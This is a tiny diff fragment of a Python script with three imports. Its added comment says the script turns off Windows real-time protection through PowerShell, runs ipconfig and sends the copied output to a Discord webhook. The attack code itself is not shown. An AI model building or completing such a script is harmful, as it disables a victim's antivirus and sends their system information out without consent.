@@ -1,3 +1,4 @@
+this script turns off real time protection using power shell, opens command prompt and runs ipconfig, copys all of the text and sends it to a discord server via webhook
 import subprocess
 import pyautogui
 import time
